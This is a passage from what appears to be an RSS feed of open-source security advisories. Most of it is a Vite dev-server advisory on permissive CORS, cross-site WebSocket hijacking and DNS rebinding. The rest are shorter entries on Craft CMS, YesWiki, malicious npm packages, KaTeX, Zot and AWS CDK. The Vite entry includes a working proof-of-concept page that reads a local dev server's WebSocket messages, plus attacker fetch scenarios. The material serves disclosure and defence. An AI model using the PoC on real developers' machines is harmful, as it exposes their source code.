Vite allowed any websites to send any requests to the development server and read the response due to default CORS settings and lack of validation on the Origin header for WebSocket connections.

&amp;gt; [!WARNING]
&amp;gt; This vulnerability even applies to users that only run the Vite dev server on the local machine and does not expose the dev server to the network.

### Upgrade Path
Users that does not match either of the following conditions should be able to upgrade to a newer version of Vite that fixes the vulnerability without any additional configuration.

- Using the backend integration feature
- Using a reverse proxy in front of Vite
- Accessing the development server via a domain other than `localhost` or `*.localhost`
- Using a plugin &#x2F; framework that connects to the WebSocket server on their own from the browser

#### Using the backend integration feature
If you are using the backend integration feature and not setting [`server.origin`](https:&#x2F;&#x2F;vite.dev&#x2F;config&#x2F;server-options.html#server-origin), you need to add the origin of the backend server to the [`server.cors.origin`](https:&#x2F;&#x2F;github.com&#x2F;expressjs&#x2F;cors#configuration-options) option. Make sure to set a specific origin rather than `*`, otherwise any origin can access your development server.

#### Using a reverse proxy in front of Vite
If you are using a reverse proxy in front of Vite and sending requests to Vite with a hostname other than `localhost` or `*.localhost`, you need to add the hostname to the new [`server.allowedHosts`](https:&#x2F;&#x2F;vite.dev&#x2F;config&#x2F;server-options.html#server-allowedhosts) option. For example, if the reverse proxy is sending requests to `http:&#x2F;&#x2F;vite:5173`, you need to add `vite` to the `server.allowedHosts` option.

#### Accessing the development server via a domain other than `localhost` or `*.localhost`
You need to add the hostname to the new [`server.allowedHosts`](https:&#x2F;&#x2F;vite.dev&#x2F;config&#x2F;server-options.html#server-allowedhosts) option. For example, if you are accessing the development server via `http:&#x2F;&#x2F;foo.example.com:8080`, you need to add `foo.example.com` to the `server.allowedHosts` option.

#### Using a plugin &#x2F; framework that connects to the WebSocket server on their own from the browser
If you are using a plugin &#x2F; framework, try upgrading to a newer version of Vite that fixes the vulnerability. If the WebSocket connection appears not to be working, the plugin &#x2F; framework may have a code that connects to the WebSocket server on their own from the browser.

In that case, you can either:

- fix the plugin &#x2F; framework code to the make it compatible with the new version of Vite
- set `legacy.skipWebSocketTokenCheck: true` to opt-out the fix for [2] while the plugin &#x2F; framework is incompatible with the new version of Vite
  - When enabling this option, **make sure that you are aware of the security implications** described in the impact section of [2] above.

### Mitigation without upgrading Vite
#### [1]: Permissive default CORS settings
Set `server.cors` to `false` or limit `server.cors.origin` to trusted origins.

#### [2]: Lack of validation on the Origin header for WebSocket connections
There aren&#x27;t any mitigations for this.

#### [3]: Lack of validation on the Host header for HTTP requests
Use Chrome 94+ or use HTTPS for the development server.

### Details

There are three causes that allowed malicious websites to send any requests to the development server:

#### [1]: Permissive default CORS settings

Vite sets the [`Access-Control-Allow-Origin`](https:&#x2F;&#x2F;developer.mozilla.org&#x2F;en-US&#x2F;docs&#x2F;Web&#x2F;HTTP&#x2F;Headers&#x2F;Access-Control-Allow-Origin) header depending on [`server.cors`](https:&#x2F;&#x2F;vite.dev&#x2F;config&#x2F;server-options.html#server-cors) option. The default value was `true` which sets `Access-Control-Allow-Origin: *`. This allows websites on any origin to `fetch` contents served on the development server.

Attack scenario:

1. The attacker serves a malicious web page (`http:&#x2F;&#x2F;malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker sends a `fetch(&#x27;http:&#x2F;&#x2F;127.0.0.1:5173&#x2F;main.js&#x27;)` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that&#x27;s not the case for the reasons above.
4. The attacker gets the content of `http:&#x2F;&#x2F;127.0.0.1:5173&#x2F;main.js`.

#### [2]: Lack of validation on the Origin header for WebSocket connections

Vite starts a WebSocket server to handle HMR and other functionalities. This WebSocket server [did not perform validation on the Origin header](https:&#x2F;&#x2F;github.com&#x2F;vitejs&#x2F;vite&#x2F;blob&#x2F;v6.0.7&#x2F;packages&#x2F;vite&#x2F;src&#x2F;node&#x2F;server&#x2F;ws.ts#L145-L157) and was vulnerable to Cross-Site WebSocket Hijacking (CSWSH) attacks. With that attack, an attacker can read and write messages on the WebSocket connection. Vite only sends some information over the WebSocket connection ([list of the file paths that changed, the file content where the errored happened, etc.](https:&#x2F;&#x2F;github.com&#x2F;vitejs&#x2F;vite&#x2F;blob&#x2F;v6.0.7&#x2F;packages&#x2F;vite&#x2F;types&#x2F;hmrPayload.d.ts#L12-L72)), but plugins can send arbitrary messages and may include more sensitive information.

Attack scenario:

1. The attacker serves a malicious web page (`http:&#x2F;&#x2F;malicious.example.com`).
2. The user accesses the malicious web page.
3. The attacker runs `new WebSocket(&#x27;http:&#x2F;&#x2F;127.0.0.1:5173&#x27;, &#x27;vite-hmr&#x27;)` by JS in that malicious web page.
4. The user edits some files.
5. Vite sends some HMR messages over WebSocket.
6. The attacker gets the content of the HMR messages.

#### [3]: Lack of validation on the Host header for HTTP requests

Unless [`server.https`](https:&#x2F;&#x2F;vite.dev&#x2F;config&#x2F;server-options.html#server-https) is set, Vite starts the development server on HTTP. Non-HTTPS servers are vulnerable to DNS rebinding attacks without validation on the Host header. But Vite did not perform validation on the Host header. By exploiting this vulnerability, an attacker can send arbitrary requests to the development server bypassing the same-origin policy.

1. The attacker serves a malicious web page that is served on **HTTP** (`http:&#x2F;&#x2F;malicious.example.com:5173`) (HTTPS won&#x27;t work).
2. The user accesses the malicious web page.
3. The attacker changes the DNS to point to 127.0.0.1 (or other private addresses).
4. The attacker sends a `fetch(&#x27;&#x2F;main.js&#x27;)` request by JS in that malicious web page.
5. The attacker gets the content of `http:&#x2F;&#x2F;127.0.0.1:5173&#x2F;main.js` bypassing the same origin policy.

### Impact
#### [1]: Permissive default CORS settings
Users with the default `server.cors` option may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

#### [2]: Lack of validation on the Origin header for WebSocket connections
All users may get the file paths of the files that changed and the file content where the error happened be stolen by malicious websites.

For users that is using a plugin that sends messages over WebSocket, that content may be stolen by malicious websites.

For users that is using a plugin that has a functionality that is triggered by messages over WebSocket, that functionality may be exploited by malicious websites.

#### [3]: Lack of validation on the Host header for HTTP requests
Users using HTTP for the development server and using a browser that is not Chrome 94+ may:

- get the source code stolen by malicious websites
- give the attacker access to functionalities that are not supposed to be exposed externally
  - Vite core does not have any functionality that causes changes somewhere else when receiving a request, but plugins may implement those functionalities and servers behind `server.proxy` may have those functionalities.

Chrome 94+ users are not affected for [3], because [sending a request to a private network page from public non-HTTPS page is forbidden](https:&#x2F;&#x2F;developer.chrome.com&#x2F;blog&#x2F;private-network-access-update#chrome_94) since Chrome 94.

### Related Information
Safari has [a bug that blocks requests to loopback addresses from HTTPS origins](https:&#x2F;&#x2F;bugs.webkit.org&#x2F;show_bug.cgi?id=171934). This means when the user is using Safari and Vite is listening on lookback addresses, there&#x27;s another condition of &quot;the malicious web page is served on HTTP&quot; to make [1] and [2] to work.

### PoC
#### [2]: Lack of validation on the Origin header for WebSocket connections
1. I used the `react` template which utilizes HMR functionality.

```
npm create vite@latest my-vue-app-react -- --template react
```

2. Then on a malicious server, serve the following POC html:
```html
&amp;lt;!doctype html&amp;gt;
&amp;lt;html lang=&quot;en&quot;&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&quot;utf-8&quot; &#x2F;&amp;gt;
        &amp;lt;title&amp;gt;vite CSWSH&amp;lt;&#x2F;title&amp;gt;
    &amp;lt;&#x2F;head&amp;gt;
    &amp;lt;body&amp;gt;
        &amp;lt;div id=&quot;logs&quot;&amp;gt;&amp;lt;&#x2F;div&amp;gt;
        &amp;lt;script&amp;gt;
            const div = document.querySelectorAll(&#x27;#logs&#x27;)[0];
            const ws = new WebSocket(&#x27;ws:&#x2F;&#x2F;localhost:5173&#x27;,&#x27;vite-hmr&#x27;);
            ws.onmessage = event =&amp;gt; {
                const logLine = document.createElement(&#x27;p&#x27;);
                logLine.innerHTML = event.data;
                div.append(logLine);
            };
        &amp;lt;&#x2F;script&amp;gt;
    &amp;lt;&#x2F;body&amp;gt;
&amp;lt;&#x2F;html&amp;gt;
```

3. Kick off Vite 

```
npm run dev
```

4. Load the development server (open `http:&#x2F;&#x2F;localhost:5173&#x2F;`) as well as the malicious page in the browser. 
5. Edit `src&#x2F;App.jsx` file and intentionally place a syntax error
6. Notice how the malicious page can view the websocket messages and a snippet of the source code is exposed

Here&#x27;s a video demonstrating the POC:

https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;a4ad05cd-0b34-461c-9ff6-d7c8663d6961
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-x684-96hh-833x: 8.0 | <b>Craft CMS has a potential RCE with a compromised security key</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-x684-96hh-833x</link>
                    <pubDate>2025-01-21T19:48:38Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-x684-96hh-833x'>https://osv.dev/vulnerability/GHSA-x684-96hh-833x</a><br>
                            <b>Published:</b> 2025-01-21T19:48:38Z<br>
                            <b>Severity:</b> 8.0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x'>https://github.com/craftcms/cms/security/advisories/GHSA-x684-96hh-833x</a></li><li>- <a target='_blank' href='https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603'>https://github.com/craftcms/cms/commit/e59e22b30c9dd39e5e2c7fe02c147bcbd004e603</a></li><li>- <a target='_blank' href='https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret'>https://craftcms.com/knowledge-base/securing-craft#keep-your-secrets-secret</a></li><li>- <a target='_blank' href='https://github.com/craftcms/cms'>https://github.com/craftcms/cms</a></li></ul><br>
                            <b>Details:</b> <b>Craft CMS has a potential RCE with a compromised security key</b><br>### Impact

This is an RCE vulnerability that affects Craft 4 and 5 installs where your security key has already been compromised.

https:&#x2F;&#x2F;craftcms.com&#x2F;knowledge-base&#x2F;securing-craft#keep-your-secrets-secret

Anyone running an unpatched version of Craft with a compromised security key is affected.

### Patches

This has been patched in Craft 5.5.8 and 4.13.8.

### Workarounds

If you can&#x27;t update to a patched version, then rotating your security key and ensuring its privacy will help to migitgate the issue.

### References

https:&#x2F;&#x2F;github.com&#x2F;craftcms&#x2F;cms&#x2F;commit&#x2F;e59e22b30c9dd39e5e2c7fe02c147bcbd004e603
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2024-51417: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2024-51417</link>
                    <pubDate>2025-01-21T19:15:10Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2024-51417'>https://osv.dev/vulnerability/CVE-2024-51417</a><br>
                            <b>Published:</b> 2025-01-21T19:15:10Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/zzzprojects/System.Linq.Dynamic.Core/issues/867'>https://github.com/zzzprojects/System.Linq.Dynamic.Core/issues/867</a></li><li>- <a target='_blank' href='https://dynamic-linq.net/expression-language#operators'>https://dynamic-linq.net/expression-language#operators</a></li><li>- <a target='_blank' href='https://zzzprojects.com/'>https://zzzprojects.com/</a></li></ul><br>
                            <b>Details:</b> <b></b><br>An issue in System.Linq.Dynamic.Core before 1.6.0 allows remote access to properties on reflection types and static properties&#x2F;fields.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-24018: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-24018</link>
                    <pubDate>2025-01-21T17:15:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-24018'>https://osv.dev/vulnerability/CVE-2025-24018</a><br>
                            <b>Published:</b> 2025-01-21T17:15:16Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> php<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660'>https://github.com/YesWiki/yeswiki/blob/v4.4.5/tools/attach/libs/attach.lib.php#L660</a></li></ul><br>
                            <b>Details:</b> <b></b><br>YesWiki is a wiki system written in PHP. In versions up to and including 4.4.5, it is possible for an authenticated user with rights to edit&#x2F;create a page or comment to trigger a stored XSS which will be reflected on any page where the resource is loaded. The vulnerability makes use of the content edition feature and more specifically of the `{{attach}}` component allowing users to attach files&#x2F;medias to a page. When a file is attached using the `{{attach}}` component, if the resource contained in the `file` attribute doesn&#x27;t exist, then the server will generate a file upload button containing the filename. This vulnerability allows any malicious authenticated user that has the right to create a comment or edit a page to be able to steal accounts and therefore modify pages, comments, permissions, extract user data (emails), thus impacting the integrity, availability and confidentiality of a YesWiki instance. Version 4.5.0 contains a patch for the issue.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-142: 0 | <b>Malicious code in next-refresh-token (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-142</link>
                    <pubDate>2025-01-19T13:31:36Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-142'>https://osv.dev/vulnerability/MAL-2025-142</a><br>
                            <b>Published:</b> 2025-01-19T13:31:36Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cycode.com/blog/malicious-code-hidden-in-npm-packages/'>https://cycode.com/blog/malicious-code-hidden-in-npm-packages/</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in next-refresh-token (npm)</b><br>This package executes a post-install script to collect system data and sends it to a remote server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-265: 0 | <b>Malicious code in openssl-node (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-265</link>
                    <pubDate>2025-01-19T13:27:34Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-265'>https://osv.dev/vulnerability/MAL-2025-265</a><br>
                            <b>Published:</b> 2025-01-19T13:27:34Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cycode.com/blog/malicious-code-hidden-in-npm-packages/'>https://cycode.com/blog/malicious-code-hidden-in-npm-packages/</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in openssl-node (npm)</b><br>This package executes a post-install script to collect system data and sends it to a remote server.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>MAL-2025-141: 0 | <b>Malicious code in serve-static-corell (npm)</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#MAL-2025-141</link>
                    <pubDate>2025-01-19T12:48:22Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/MAL-2025-141'>https://osv.dev/vulnerability/MAL-2025-141</a><br>
                            <b>Published:</b> 2025-01-19T12:48:22Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://cycode.com/blog/malicious-code-hidden-in-npm-packages/'>https://cycode.com/blog/malicious-code-hidden-in-npm-packages/</a></li></ul><br>
                            <b>Details:</b> <b>Malicious code in serve-static-corell (npm)</b><br>This package includes a post-install script that fetches JavaScript code from a remote server and executes it.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-45: 0 | <b>Security exception in POIHDGFFuzzer</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-45</link>
                    <pubDate>2025-01-19T00:14:10.746839Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-45'>https://osv.dev/vulnerability/OSV-2025-45</a><br>
                            <b>Published:</b> 2025-01-19T00:14:10.746839Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390461322'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390461322</a></li></ul><br>
                            <b>Details:</b> <b>Security exception in POIHDGFFuzzer</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=390461322

```
Crash type: Security exception
Crash state:
POIHDGFFuzzer
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>OSV-2025-42: 0 | <b>Heap-use-after-free in r_list_free</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#OSV-2025-42</link>
                    <pubDate>2025-01-19T00:06:58.533546Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/OSV-2025-42'>https://osv.dev/vulnerability/OSV-2025-42</a><br>
                            <b>Published:</b> 2025-01-19T00:06:58.533546Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390467754'>https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=390467754</a></li></ul><br>
                            <b>Details:</b> <b>Heap-use-after-free in r_list_free</b><br>OSS-Fuzz report: https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;oss-fuzz&#x2F;issues&#x2F;detail?id=390467754

```
Crash type: Heap-use-after-free READ 8
Crash state:
r_list_free
r_bin_bflt_free
r_bin_file_free
```

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>CVE-2025-23208: 0 | <b></b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#CVE-2025-23208</link>
                    <pubDate>2025-01-17T23:15:13Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/CVE-2025-23208'>https://osv.dev/vulnerability/CVE-2025-23208</a><br>
                            <b>Published:</b> 2025-01-17T23:15:13Z<br>
                            <b>Severity:</b> 0<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665'>https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665</a></li></ul><br>
                            <b>Details:</b> <b></b><br>zot is a production-ready vendor-neutral OCI image registry. The group data stored for users in the boltdb database (meta.db) is an append-list so group revocations&#x2F;removals are ignored in the API. SetUserGroups is alled on login, but instead of replacing the group memberships, they are appended. This may be due to some conflict with the group definitions in the config file, but that wasn&#x27;t obvious to me if it were the case. Any Zot configuration that relies on group-based authorization will not respect group remove&#x2F;revocation by an IdP. This issue has been addressed in version 2.1.2. All users are advised to upgrade. There are no known workarounds for this vulnerability.
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-c9p4-xwr9-rfhx: 7.3 | <b>Zot IdP group membership revocation ignored</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-c9p4-xwr9-rfhx</link>
                    <pubDate>2025-01-17T22:02:26Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-c9p4-xwr9-rfhx'>https://osv.dev/vulnerability/GHSA-c9p4-xwr9-rfhx</a><br>
                            <b>Published:</b> 2025-01-17T22:02:26Z<br>
                            <b>Severity:</b> 7.3<br>
                            <b>Langs:</b> go<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/project-zot/zot/security/advisories/GHSA-c9p4-xwr9-rfhx'>https://github.com/project-zot/zot/security/advisories/GHSA-c9p4-xwr9-rfhx</a></li><li>- <a target='_blank' href='https://github.com/project-zot/zot/commit/002ac62d8a15bf0cba010b3ba7bde86f9837b613'>https://github.com/project-zot/zot/commit/002ac62d8a15bf0cba010b3ba7bde86f9837b613</a></li><li>- <a target='_blank' href='https://github.com/project-zot/zot'>https://github.com/project-zot/zot</a></li><li>- <a target='_blank' href='https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665'>https://github.com/project-zot/zot/blob/5e30fec65c49e3139907e2819ccb39b2e3bd784e/pkg/meta/boltdb/boltdb.go#L1665</a></li></ul><br>
                            <b>Details:</b> <b>Zot IdP group membership revocation ignored</b><br>### Summary
The group data stored for users in the boltdb database (meta.db) is an append-list so group revocations&#x2F;removals are ignored in the API.

### Details
[SetUserGroups](https:&#x2F;&#x2F;github.com&#x2F;project-zot&#x2F;zot&#x2F;blob&#x2F;5e30fec65c49e3139907e2819ccb39b2e3bd784e&#x2F;pkg&#x2F;meta&#x2F;boltdb&#x2F;boltdb.go#L1665) is alled on login, but instead of replacing the group memberships, they are appended. This may be due to some conflict with the group definitions in the config file, but that wasn&#x27;t obvious to me if it were the case.

### PoC
Login with group claims, logout, remove the user from a group from at IdP and log in again, the API still grants access and the new list of groups is appended creating meaningless duplicate entries and no longer mathing the expected groups from the IdP. The behavior can be verified by seeing the API or UI still presenting images it should not or by viewing the data directly:  `bbolt get meta.db UserData &amp;lt;user&amp;gt;`, eg:

![image](https:&#x2F;&#x2F;github.com&#x2F;user-attachments&#x2F;assets&#x2F;3491cbd2-c7d9-414d-bc33-3efc35ed0582)

Note this example also has duplicates due to group hierarchy changes that were left in the database.

### Impact
Any Zot configuration that relies on group-based authorization will not respect group remove&#x2F;revocation by an IdP.

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-cg87-wmx4-v546: 6.3 | <b>KaTeX \htmlData does not validate attribute names</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-cg87-wmx4-v546</link>
                    <pubDate>2025-01-17T21:22:56Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-cg87-wmx4-v546'>https://osv.dev/vulnerability/GHSA-cg87-wmx4-v546</a><br>
                            <b>Published:</b> 2025-01-17T21:22:56Z<br>
                            <b>Severity:</b> 6.3<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546'>https://github.com/KaTeX/KaTeX/security/advisories/GHSA-cg87-wmx4-v546</a></li><li>- <a target='_blank' href='https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c'>https://github.com/KaTeX/KaTeX/commit/ff289955e81aab89086eef09254cbf88573d415c</a></li><li>- <a target='_blank' href='https://github.com/KaTeX/KaTeX'>https://github.com/KaTeX/KaTeX</a></li></ul><br>
                            <b>Details:</b> <b>KaTeX \htmlData does not validate attribute names</b><br>### Impact
KaTeX users who render untrusted mathematical expressions with `renderToString` could encounter malicious input using `\htmlData` that runs arbitrary JavaScript, or generate invalid HTML.

### Patches
Upgrade to KaTeX v0.16.21 to remove this vulnerability.

### Workarounds
- Avoid use of or turn off the `trust` option, or set it to forbid `\htmlData` commands.
- Forbid inputs containing the substring `&quot;\\htmlData&quot;`.
- Sanitize HTML output from KaTeX.

### Details
`\htmlData` did not validate its attribute name argument, allowing it to generate invalid or malicious HTML that runs scripts.

### For more information
If you have any questions or comments about this advisory:

- Open an issue or security advisory in the [KaTeX repository](https:&#x2F;&#x2F;github.com&#x2F;KaTeX&#x2F;KaTeX&#x2F;)
- Email us at [katex-security@mit.edu](mailto:katex-security@mit.edu)
                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-v4mq-x674-ff73: 1.8 | <b>AWS Cloud Development Kit (AWS CDK) IAM OIDC custom resource allows connection to unauthorized OIDC provider</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-v4mq-x674-ff73</link>
                    <pubDate>2025-01-17T21:22:25Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-v4mq-x674-ff73'>https://osv.dev/vulnerability/GHSA-v4mq-x674-ff73</a><br>
                            <b>Published:</b> 2025-01-17T21:22:25Z<br>
                            <b>Severity:</b> 1.8<br>
                            <b>Langs:</b> ts<br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73'>https://github.com/aws/aws-cdk/security/advisories/GHSA-v4mq-x674-ff73</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/issues/32920'>https://github.com/aws/aws-cdk/issues/32920</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/pull/32921'>https://github.com/aws/aws-cdk/pull/32921</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560'>https://github.com/aws/aws-cdk/commit/3e4f3773bfa48b75bf0adc7d53d46bbec7714a9e#diff-38a03353f201fd2e520df67fb43f9f000257bffd6e9acaa5569cce7005a77560</a></li><li>- <a target='_blank' href='https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html'>https://docs.aws.amazon.com/cdk/v2/guide/featureflags.html</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk'>https://github.com/aws/aws-cdk</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34'>https://github.com/aws/aws-cdk/blob/d16482fc8a4a3e1f62751f481b770c09034df7d2/packages/%40aws-cdk/custom-resource-handlers/lib/aws-iam/oidc-handler/external.ts#L34</a></li><li>- <a target='_blank' href='https://github.com/aws/aws-cdk/releases/tag/v2.177.0'>https://github.com/aws/aws-cdk/releases/tag/v2.177.0</a></li></ul><br>
                            <b>Details:</b> <b>AWS Cloud Development Kit (AWS CDK) IAM OIDC custom resource allows connection to unauthorized OIDC provider</b><br>### Impact
Users who use IAM OIDC custom resource provider package will download CA Thumbprints as part of the custom resource workflow, https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;aws-cdk&#x2F;blob&#x2F;d16482fc8a4a3e1f62751f481b770c09034df7d2&#x2F;packages&#x2F;%40aws-cdk&#x2F;custom-resource-handlers&#x2F;lib&#x2F;aws-iam&#x2F;oidc-handler&#x2F;external.ts#L34. 

However, the current `tls.connect` method will always set `rejectUnauthorized: false` which is a potential security concern. CDK should follow the best practice and set `rejectUnauthorized: true`. However, this could be a breaking change for existing CDK applications and we should fix this with a feature flag. 

Note that this is marked as low severity Security advisory because the issuer url is provided by CDK users who define the CDK application. If they insist on connecting to a unauthorized OIDC provider, CDK should not disallow this. Additionally, the code block is run in a Lambda environment which mitigate the MITM attack.

As a best practice, CDK should still fix this issue under a feature flag to avoid regression.

```
packages&#x2F;@aws-cdk&#x2F;custom-resource-handlers&#x2F;lib&#x2F;aws-iam&#x2F;oidc-handler&#x2F;external.ts
❯❱ problem-based-packs.insecure-transport.js-node.bypass-tls-verification.bypass-tls-verification
Checks for setting the environment variable NODE_TLS_REJECT_UNAUTHORIZED to 0, which disables TLS
verification. This should only be used for debugging purposes. Setting the option rejectUnauthorized
to false bypasses verification against the list of trusted CAs, which also leads to insecure
transport.
```

### Patches
The patch is in progress. To mitigate, upgrade to CDK v2.177.0 (Expected release date 2025-02-22). 
Once upgraded, please make sure the feature flag &#x27;@aws-cdk&#x2F;aws-iam:oidcRejectUnauthorizedConnections&#x27; is set to true in `cdk.context.json` or `cdk.json`. More details on feature flag setting is [here](https:&#x2F;&#x2F;docs.aws.amazon.com&#x2F;cdk&#x2F;v2&#x2F;guide&#x2F;featureflags.html).

### Workarounds
N&#x2F;A

### References
https:&#x2F;&#x2F;github.com&#x2F;aws&#x2F;aws-cdk&#x2F;issues&#x2F;32920

                        ]]>
                    </description>
                </item>
            
                <item>
                    <title>GHSA-fcr8-4r9f-r66m: 8.6 | <b>nbgrader&#x27;s `frame-ancestors: self` grants all users access to formgrader</b></title>
                    <link>https://oss-vulns.alecmaly.com/report.html#GHSA-fcr8-4r9f-r66m</link>
                    <pubDate>2025-01-17T16:29:16Z</pubDate>
                    <description>
                        <![CDATA[
                            source: <a href='https://osv.dev/vulnerability/GHSA-fcr8-4r9f-r66m'>https://osv.dev/vulnerability/GHSA-fcr8-4r9f-r66m</a><br>
                            <b>Published:</b> 2025-01-17T16:29:16Z<br>
                            <b>Severity:</b> 8.6<br>
                            <b>Langs:</b> <br>
                            <b>References:</b> <ul><li>- <a target='_blank' href='https://github.com/jupyter/nbgrader/security/advisories/GHSA-fcr8-4r9f-r66m'>https://github.com/jupyter/nbgrader/security/advisories/GHSA-fcr8-4r9f-r66m</a></li><li>- <a target='_blank' href='https://github.com/jupyter/nbgrader/pull/1915'>https://github.com/jupyter/nbgrader/pull/1915</a></li><li>- <a target='_blank' href='https://github.com/jupyter/nbgrader/commit/73e137511ac1dc02e95790d4fd6d4d88dab42325'>https://github.com/jupyter/nbgrader/commit/73e137511ac1dc02e95790d4fd6d4d88dab42325</a></li><li>- <a target='_blank' href='https://github.com/jupyter/nbgrader'>https://github.com/jupyter/nbgrader</a></li><li>- <a target='_blank' href='https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html'>https://jupyterhub.readthedocs.io/en/stable/explanation/websecurity.html</a></li></ul><br>
                            <b>Details:</b> <b>nbgrader&#x27;s `frame-ancestors: self` grants all users access to formgrader</b><br>### Impact

